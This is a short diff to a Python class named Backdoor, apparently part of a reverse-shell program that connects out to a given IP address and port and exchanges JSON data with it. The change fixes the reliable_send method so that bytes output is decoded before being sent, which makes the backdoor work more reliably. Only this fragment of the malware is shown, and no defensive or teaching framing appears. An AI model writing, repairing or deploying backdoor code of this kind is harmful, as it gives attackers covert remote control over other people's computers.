@@ -8,7 +8,7 @@ class Backdoor:
         self.connection.connect((ip, port))
 
     def reliable_send(self, data):
-        json_data = json.dumps(data)
+        json_data = json.dumps(data.decode() if type(data) == bytes else data)
         self.connection.send(json_data.encode())
         
     def reliable_receive(self):
